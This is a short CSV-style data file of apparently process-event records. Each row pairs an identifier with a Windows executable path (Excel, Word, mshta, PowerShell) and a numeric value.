874e15e2-f127-83e8-9787-0867e917339b,{'subject': 'c:\\program files\\microsoft office\\office14\\excel.exe None'},643110
2e0add6c-480e-8249-bb03-cef711aee34a,{'subject': 'c:\\windows\\system32\\mshta.exe None'},644371
a1d10ff8-bf52-85ba-89e1-756ec9db7a86,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},644240
5785b732-d9a3-8a2e-ae22-4cd94fde22e9,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},644212
ffea7b2d-503c-8c50-8eb6-2baeaec2c90b,{'subject': 'c:\\program files\\microsoft office\\office14\\excel.exe None'},643096
e4c7e746-28f1-807a-8ef1-db12b1507040,{'subject': 'c:\\windows\\system32\\mshta.exe None'},646099
04b27c4f-3d96-840c-bd48-4fbd30692d96,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},646034
076fd925-af03-8d79-9c76-85f8d2f89f20,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},646018
6416e1a8-d269-81ae-890c-e2f1756e4252,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},648373
1aa7b94f-c82b-8cc9-b8da-32e0393bb77d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},648336
